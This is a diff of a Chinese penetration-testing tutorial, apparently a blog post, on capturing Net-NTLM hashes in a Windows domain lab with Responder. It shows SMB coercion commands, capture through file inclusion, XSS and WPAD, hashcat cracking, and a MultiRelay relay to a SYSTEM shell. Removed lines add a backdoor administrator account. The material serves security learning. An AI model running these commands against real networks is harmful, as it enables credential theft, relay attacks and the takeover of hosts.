@@ -1,5 +1,5 @@
 +++
-title = "内网渗透之Responder与Net-NTLM hash"
+title = "内网渗透之 Responder 与 Net-NTLM hash"
 topics = ["Pentest"]
 tags = ["intranet"]
 description = "获取windows的hash"
@@ -8,36 +8,36 @@ draft = false
 +++
 
 ### 0x00 一些概念
-* Windows认证协议  
-分为：基于NTLM的认证和基于kerberos的认证
+* Windows 认证协议  
+分为：基于 NTLM 的认证和基于 kerberos 的认证
 
-* 什么是NTLM Hash？  
-早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash
+* 什么是 NTLM Hash？  
+早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash
 
-* 什么是Challenge-Response挑战/响应验证机制？  
-    * Client输入username、password、domain，然后将用户名及密码hash后存在本地，并将username发送到 DC
-    * DC生成一个16字节的随机数，即Challenge(挑战码)，然后传回Client
-    * Client收到Challenge后将密码hash和challenge混合hash，混合后的hash称为response，然后将challenge、response和username发送给Server
-    * Server将收到的3个值转发给DC，然后DC根据传过来的username到域控的账号数据库ntds.list找到对应的密码hash，将hash和Client传过来的challenge混合hash，将这个混合hash与Client传过来的response进行对比验证
+* 什么是 Challenge-Response 挑战/响应验证机制？  
+    * Client 输入 username、password、domain，然后将用户名及密码 hash 后存在本地，并将 username 发送到 DC
+    * DC 生成一个 16 字节的随机数，即 Challenge(挑战码)，然后传回 Client
+    * Client 收到 Challenge 后将密码 hash 和 challenge 混合 hash，混合后的 hash 称为 response，然后将 challenge、response 和 username 发送给 Server
+    * Server 将收到的 3 个值转发给 DC，然后 DC 根据传过来的 username 到域控的账号数据库 ntds.list 找到对应的密码 hash，将 hash 和 Client 传过来的 challenge 混合 hash，将这个混合 hash 与 Client 传过来的 response 进行对比验证
 
 * NTLM Hash 与 Net-NTLM Hash
-    * NTLM Hash 通常是指 Windows 系统下 Security Account Manager 中保存的用户密码 hash，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件中获得所有用户的 hash（比如用Mimikatz提取），“挑战/响应验证”中的用户名及密码 hash 就是NTLM Hash，可以用来进行 PTH 攻击(NTLM 中继攻击)
-    * Net-NTLM Hash 通常是指网络环境下 NTLM 认证中的 hash，“挑战/响应验证”中的 response 中包含 Net-NTLM hash，用Responder抓取的就是 Net-NTLM Hash，可以用来做中间人攻击
+    * NTLM Hash 通常是指 Windows 系统下 SAM 中保存的用户密码 hash，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件中获得所有用户的 hash（比如用 Mimikatz 提取），“挑战/响应验证”中的用户名及密码 hash 就是 NTLM Hash，可以用来进行 PTH 攻击
+    * Net-NTLM Hash 通常是指网络环境下 NTLM 认证中的 hash，是基于用户密码的 NTLM Hash 计算出来的，“挑战/响应验证”中的 response 中包含 Net-NTLM hash，而用 Responder 抓取的就是 Net-NTLM Hash，可以用来做中间人攻击
 
-* 关于Responder  
-由Laurent Gaffie撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder也有能力攻击LLMNR，NBT-NS和mDNS等协议。
+* 关于 Responder  
+由 Laurent Gaffie 撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括 Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如 SQL 服务器，FTP，HTTP 和 SMB 服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder 也有能力攻击 LLMNR，NBT-NS 和 mDNS 等协议。
 
-* 什么是NTLM中继攻击？  
-攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。
+* 什么是 NTLM 中继攻击？  
+攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。
 
 ### 0x01 软件环境
 * 可以从[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder?_blank)下载Responder
-* 域内主机：Win7（10.11.11.20）
-* 域控主机：Win2008（10.11.11.18）
 * 被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段
+* 域控主机：Win2008（10.11.11.5）用户 Administrator
+* 域内主机：Win7（10.11.11.7）登录用户 zhangsan
 
-### 0x02 通过SMB服务获取Net-NTLM hash   
-对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash
+### 0x02 通过 SMB 服务获取 Net-NTLM hash   
+对于 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 hash 尝试登录，所以可以模拟 SMB 服务器从而截获 hash，执行如下命令都可以得到 hash
 
 ```bash
 net.exe use \\host\share
@@ -88,29 +88,58 @@ msra.exe /openfile \\host\share #(noisy, error)
 mstsc.exe \\host\share #(noisy, error)
 netcfg.exe -l \\host\share -c p -i foo
 ```
-* 被控主机执行：$ sudo python Responder.py -I eth0 -v
-![90](/img/post/20180911-124855.png)
+* 攻击机配置开启 SMB 后执行：$ sudo python Responder.py -I eth0 -v
+![90](/img/post/Xnip2020-12-11_11-02-33.png)
 
-### 0x03 通过文件包含获取Net-NTLM hash
-* 被控主机执行：$ sudo python Responder.py -I eth0 -v
-![90](/img/post/20180911-132027.png)
+### 0x03 通过 web 漏洞获取 Net-NTLM hash
+前提：同样是开启 SMB 服务，然后执行 sudo python Responder.py -I eth0 -v
 
-### 0x04 通过XSS获取Net-NTLM hash
-* 被控主机执行：$ sudo python Responder.py -I eth0 -v
-![80](/img/post/20180911-163241.png)
+* 通过文件包含获取(获取到的是 Administrator 的 hash)
+![90](/img/post/Xnip2020-12-11_11-39-10.png)
 
-### 0x05 WPAD代理服务器抓取Net-NTLM hash
-WPAD用于在windows中自动化的设置ie浏览器的代理，从Windows 2000开始该功能被默认开启。
+* 通过 XSS 获取(获取到的是 zhangsan 的 hash)
+![80](/img/post/Xnip2020-12-11_11-46-56.png)
 
-开启Responder的WPAD后，当PC浏览网站时即可抓取到NTLM hash
+### 0x04 WPAD 代理服务器抓取 Net-NTLM hash
+WPAD 用于在 windows 中自动化的设置 ie 浏览器的代理，从 Windows 2000 开始该功能被默认开启。
 
-加-F参数即可开启WPAD抓取 hash，而且当主机重启时也能抓到NTLM hash
+开启 Responder 的 WPAD 后，当 PC 浏览网站时即可抓取到 NET-NTLM hash。
 
-* 被控主机执行：$ sudo python Responder.py -I eth0 -v -F
-![90](/img/post/20180911-205517.png)
-![80](/img/post/20180911-210126.png)
+* 参数说明
 
-### 0x06 使用hashcat解密
+```
+-w, --wpad            Start the WPAD rogue proxy server. Default value is False
+-F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
+                        retrieval. This may cause a login prompt. Default: False
+
+加 -w on 参数即可开启 WPAD 抓取 hash
+```
+
+* 配置(开启 http 和 https)
+
+```bash
+➜  Responder git:(master) ✗ head -n 16 Responder.conf
+[Responder Core]
+
+; Servers to start
+SQL = Off
+SMB = Off
+RDP = Off
+Kerberos = Off
+FTP = Off
+POP = Off
+SMTP = Off
+IMAP = Off
+HTTP = On
+HTTPS = On
+DNS = Off
+LDAP = Off
+```
+
+* 攻击机执行：$ sudo python Responder.py -I eth0 -v -w on -F on
+![90](/img/post/Xnip2020-12-11_14-28-15.png)
+
+### 0x05 使用hashcat解密
 * 安装hashcat(参考[这里](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank))
 
 ```bash
@@ -129,15 +158,18 @@ $ ./hashcat
 得到密码为123456
 ![80](/img/post/20180912-233101.png)
 
-### 0x07 通过NTLM中继攻击添加用户
-这里就用到了NTLM中继攻击，相当于是中间人攻击，攻击者获取高权限的主机的hash，然后将hash转发给低权限主机并执行命令
+### 0x06 利用 Responder 的 MultiRelay 进行中继攻击(鸡肋)
+NTLM 中继攻击：将高权限主机的 NET-NTLM hash 转发给低权限主机(只能 Relay 未开启 SMB 签名的主机)
 
-这里就是抓取域控的hash，然后执行命令得到域内主机的信息
+比如 Relay 域控的 NET-NTLM hash 到域内主机，从而获取域内主机的权限
 
-* 修改Responder.conf，不启动SMB和HTTP，然后启动Responder
+* 首先查找未开启 SMB 签名的主机
+![70](/img/post/Xnip2020-12-11_15-23-09.png)
+
+* 修改 Responder.conf，关闭 SMB 和 HTTP，然后启动 Responder
 
 ```bash
-reber@ubuntu:~/Responder$ head -n 14 Responder.conf
+➜  Responder git:(master) ✗ head -n 16 Responder.conf
 [Responder Core]
 
 ; Servers to start
@@ -152,15 +184,17 @@ HTTP = Off
 HTTPS = Off
 DNS = On
 LDAP = On
-
-#这里用的是-F，只要有高权限用户通过浏览器访问网页就会中招，hash就会被抓取
-reber@ubuntu:~/Responder$ sudo python Responder.py -I eth0 -v -F
+```
+```bash
+➜  Responder git:(master) ✗ sudo python Responder.py -I eth0 -v
 ```
 
-* 利用Responder的MultiRelay模块获取shell
+* 利用 Responder 的 MultiRelay 模块获取 shell
+
+运行 MultiRelay 后，高权限主机随便执行 net use 即可，比如执行 net use \\\\aaa
 
 ```ini
-reber@ubuntu:~/Responder/tools$ sudo python MultiRelay.py -t 10.11.11.20 -u ALL
+➜  tools git:(master) ✗ sudo python MultiRelay.py -t 10.11.11.7 -u ALL
 
 Responder MultiRelay 2.0 NTLMv1/2 Relay
 
@@ -183,14 +217,14 @@ Relaying credentials for these users:
 ['ALL']
 
 
-Retrieving information for 10.11.11.20...
+Retrieving information for 10.11.11.7...
 SMB signing: False
-Os version: 'Windows 7 Professional 7600'
-Hostname: 'WIN-7'
-Part of the 'REBER' domain
-[+] Setting up HTTP relay with SMB challenge: f34fb4118e70e824
-[+] Received NTLMv2 hash from: 10.11.11.18
-[+] Client info: ['Windows Server 2008 R2 Enterprise 7600', domain: 'REBER', signing:'True']
+Os version: 'Windows 7 Professional 7601 Service Pack 1'
+Hostname: 'WIN7'
+Part of the 'TEST' domain
+[+] Setting up SMB relay with SMB challenge: fb5db119d38f2d0d
+[+] Received NTLMv2 hash from: 10.11.11.5
+[+] Client info: ['Windows Server 2008 R2 Enterprise 7600', domain: 'TEST', signing:'True']
 [+] Username: Administrator is whitelisted, forwarding credentials.
 [+] SMB Session Auth sent.
 [+] Looks good, Administrator has admin rights on C$.
@@ -216,25 +250,11 @@ exit               -> Exit this shell and return in relay mode.
 
 Any other command than that will be run as SYSTEM on the target.
 
-Connected to 10.11.11.20 as LocalSystem.
-C:\Windows\system32\:#net user test 123456 /add && net localgroup administrators test /add
-▒▒▒▒ɹ▒▒▒ɡ▒
+Connected to 10.11.11.7 as LocalSystem.
+C:\Windows\system32\:#whoami
+nt authority\system
 
-
-C:\Windows\system32\:#net user
-
-\\ ▒▒▒û▒▒ʻ▒
-
--------------------------------------------------------------------------------
-Administrator            Guest                    reber
-test
-▒▒▒▒▒▒▒▒▒▒ϣ▒▒▒▒▒▒▒һ▒▒▒▒▒▒▒▒
-
-
-C:\Windows\system32\:#exit
-[+] Returning in relay mode.
-Exiting...
-reber@ubuntu:~/Responder/tools$
+C:\Windows\system32\:#
 ```
 
 
